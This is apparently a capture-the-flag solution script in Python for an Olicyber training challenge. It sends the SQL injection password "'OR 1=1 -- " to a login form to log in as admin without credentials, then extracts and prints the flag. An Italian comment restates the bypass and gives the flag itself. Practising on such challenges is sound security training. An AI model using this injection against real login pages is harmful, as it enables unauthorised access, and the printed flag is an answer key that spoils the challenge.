import requests
import re

site = "http://basic-sqli.challs.olicyber.it/"

data = {
    "username" : "admin",
    "password" : "'OR 1=1 -- "
}

r = requests.post(site, data=data).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)



#non penso ci sia bisogno di un writeup, basta fare login con username admin e password 'OR 1=1 --  per entrare come admin
#flag{y0u_sh0uld_u53_pr3p4r3d_st4t3m3nt5}
